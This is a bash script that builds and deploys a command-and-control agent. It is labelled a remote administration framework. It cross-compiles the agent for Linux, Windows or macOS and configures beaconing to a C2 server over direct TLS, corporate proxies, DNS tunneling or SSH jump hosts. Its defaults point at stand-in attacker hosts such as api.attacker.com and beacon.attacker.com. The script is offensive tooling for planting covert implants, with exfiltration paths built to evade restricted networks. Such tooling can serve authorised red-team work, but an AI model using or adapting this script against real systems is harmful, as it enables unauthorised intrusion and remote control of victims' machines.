#!/bin/bash
# Agent Deployment Script - Automated Setup

set -e

echo "╔════════════════════════════════════════════════════════╗"
echo "║  🚀 Agent Deployment Assistant                        ║"
echo "║  Secure Remote Administration Framework               ║"
echo "╚════════════════════════════════════════════════════════╝"
echo ""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
C2_SERVER="${C2_SERVER:-http://localhost:8000}"
AGENT_ID="${AGENT_ID:-$(hostname)}"
BEACON_INTERVAL="${BEACON_INTERVAL:-30}"
ENCRYPTION_KEY="${ENCRYPTION_KEY:-}"
PROXY_URL="${PROXY_URL:-}"
DNS_DOMAIN="${DNS_DOMAIN:-}"

echo -e "${BLUE}[*] Configuration:${NC}"
echo "    C2 Server: $C2_SERVER"
echo "    Agent ID: $AGENT_ID"
echo "    Beacon Interval: $BEACON_INTERVAL seconds"
echo ""

# Menu
show_menu() {
    echo -e "${YELLOW}[?] Select deployment method:${NC}"
    echo "    1) Direct TLS (Internal Network)"
    echo "    2) Proxy-Based (Corporate Network)"
    echo "    3) DNS Tunneling (Restricted Network)"
    echo "    4) SSH Jump Host"
    echo "    5) P2P Relay"
    echo "    6) Custom Configuration"
    echo ""
    read -p "Enter choice [1-6]: " METHOD
}

# Build agent
build_agent() {
    echo -e "${BLUE}[*] Building agent...${NC}"

    if [ "$1" == "windows" ]; then
        echo "    Target: Windows (x86_64)"
        rustup target add x86_64-pc-windows-gnu
        cargo build --release --target x86_64-pc-windows-gnu
        AGENT_BIN="agent/target/x86_64-pc-windows-gnu/release/agent.exe"
    elif [ "$1" == "macos" ]; then
        echo "    Target: macOS"
        cargo build --release --target x86_64-apple-darwin
        AGENT_BIN="agent/target/x86_64-apple-darwin/release/agent"
    else
        echo "    Target: Linux"
        cargo build --release
        AGENT_BIN="agent/target/release/agent"
    fi

    if [ -f "$AGENT_BIN" ]; then
        SIZE=$(ls -lh "$AGENT_BIN" | awk '{print $5}')
        echo -e "${GREEN}[✓] Agent built successfully${NC}"
        echo "    Binary: $AGENT_BIN"
        echo "    Size: $SIZE"
    else
        echo -e "${RED}[✗] Build failed${NC}"
        exit 1
    fi
}

# Configure direct TLS
configure_direct() {
    echo -e "${BLUE}[*] Configuring Direct TLS Connection${NC}"

    read -p "    C2 Server URL [http://localhost:8000]: " SERVER
    C2_SERVER=${SERVER:-http://localhost:8000}

    read -p "    Beacon Interval in seconds [30]: " INTERVAL
    BEACON_INTERVAL=${INTERVAL:-30}

    export SERVER_URL="$C2_SERVER"
    export AGENT_ID="$AGENT_ID"
    export BEACON_INTERVAL="$BEACON_INTERVAL"

    echo -e "${GREEN}[✓] Configuration complete${NC}"
}

# Configure proxy
configure_proxy() {
    echo -e "${BLUE}[*] Configuring Proxy Connection${NC}"

    read -p "    C2 Server URL [http://api.attacker.com]: " SERVER
    C2_SERVER=${SERVER:-http://api.attacker.com}

    read -p "    Proxy URL [proxy.corp.com:8080]: " PROXY
    PROXY_URL=${PROXY:-proxy.corp.com:8080}

    read -p "    Proxy Username: " PROXY_USER
    read -sp "    Proxy Password: " PROXY_PASS
    echo ""

    export SERVER_URL="$C2_SERVER"
    export PROXY_URL="$PROXY_URL"
    export PROXY_USERNAME="$PROXY_USER"
    export PROXY_PASSWORD="$PROXY_PASS"
    export PROXY_METHOD="true"

    echo -e "${GREEN}[✓] Configuration complete${NC}"
}

# Configure DNS
configure_dns() {
    echo -e "${BLUE}[*] Configuring DNS Tunneling${NC}"

    read -p "    DNS Domain [beacon.attacker.com]: " DOMAIN
    DNS_DOMAIN=${DOMAIN:-beacon.attacker.com}

    read -p "    DNS Server [8.8.8.8]: " DNS_SRV
    DNS_SRV=${DNS_SRV:-8.8.8.8}

    export SERVER_URL="dns://$DNS_DOMAIN"
    export DNS_DOMAIN="$DNS_DOMAIN"
    export DNS_SERVER="$DNS_SRV"
    export DNS_METHOD="true"

    echo -e "${GREEN}[✓] Configuration complete${NC}"
}

# Configure SSH
configure_ssh() {
    echo -e "${BLUE}[*] Configuring SSH Jump Host${NC}"

    read -p "    Jump Host [jump.corp.com]: " HOST
    SSH_HOST=${HOST:-jump.corp.com}

    read -p "    SSH User [admin]: " USER
    SSH_USER=${USER:-admin}

    read -p "    Private Key Path [/home/user/.ssh/id_rsa]: " KEY
    SSH_KEY=${KEY:-/home/user/.ssh/id_rsa}

    export SSH_HOST="$SSH_HOST"
    export SSH_USER="$SSH_USER"
    export SSH_KEY="$SSH_KEY"
    export SSH_METHOD="true"

    echo -e "${GREEN}[✓] Configuration complete${NC}"
}

# Show configuration summary
show_summary() {
    echo ""
    echo -e "${BLUE}[*] Configuration Summary:${NC}"
    echo "    Server: $C2_SERVER"
    echo "    Agent ID: $AGENT_ID"
    echo "    Beacon Interval: $BEACON_INTERVAL s"

    if [ -n "$PROXY_URL" ]; then
        echo "    Proxy: $PROXY_URL"
    fi

    if [ -n "$DNS_DOMAIN" ]; then
        echo "    DNS Domain: $DNS_DOMAIN"
    fi

    echo ""
    echo -e "${YELLOW}[?] Ready to start agent? [y/n]:${NC}"
    read -r CONFIRM

    if [ "$CONFIRM" == "y" ] || [ "$CONFIRM" == "Y" ]; then
        start_agent
    fi
}

# Start agent
start_agent() {
    echo ""
    echo -e "${GREEN}[*] Starting agent...${NC}"
    echo ""

    # Run agent with current configuration
    if [ -f "$AGENT_BIN" ]; then
        "$AGENT_BIN"
    else
        echo -e "${RED}[✗] Agent binary not found${NC}"
        exit 1
    fi
}

# Test connection
test_connection() {
    echo ""
    echo -e "${BLUE}[*] Testing connection to C2 server...${NC}"

    # Extract host and port from SERVER_URL
    HOST=$(echo "$C2_SERVER" | sed 's|http[s]*://||' | cut -d: -f1)
    PORT=$(echo "$C2_SERVER" | sed 's|http[s]*://||' | cut -d: -f2)
    PORT=${PORT:-8000}

    if nc -z -w 5 "$HOST" "$PORT" 2>/dev/null; then
        echo -e "${GREEN}[✓] Server is reachable${NC}"
        return 0
    else
        echo -e "${YELLOW}[!] Warning: Server may not be reachable${NC}"
        echo "    Host: $HOST"
        echo "    Port: $PORT"
        return 1
    fi
}

# Select target OS
select_os() {
    echo -e "${YELLOW}[?] Select target OS:${NC}"
    echo "    1) Linux"
    echo "    2) Windows"
    echo "    3) macOS"
    read -p "Enter choice [1-3]: " OS_CHOICE

    case $OS_CHOICE in
        1) OS="linux" ;;
        2) OS="windows" ;;
        3) OS="macos" ;;
        *) OS="linux" ;;
    esac
}

# Main flow
main() {
    # Check if in correct directory
    if [ ! -f "agent/Cargo.toml" ]; then
        echo -e "${RED}[✗] Error: Must run from project root${NC}"
        exit 1
    fi

    # Select OS
    select_os

    # Build agent
    build_agent "$OS"

    # Show menu
    show_menu

    # Configure based on selection
    case $METHOD in
        1) configure_direct ;;
        2) configure_proxy ;;
        3) configure_dns ;;
        4) configure_ssh ;;
        5) echo "P2P mode - configure manually"; exit 0 ;;
        6) echo "Custom configuration - configure manually"; exit 0 ;;
        *) configure_direct ;;
    esac

    # Test connection
    if ! test_connection; then
        echo -e "${YELLOW}[!] Continue anyway? [y/n]:${NC}"
        read -r CONT
        if [ "$CONT" != "y" ] && [ "$CONT" != "Y" ]; then
            exit 1
        fi
    fi

    # Show summary and start
    show_summary
}

# Run main
main "$@"
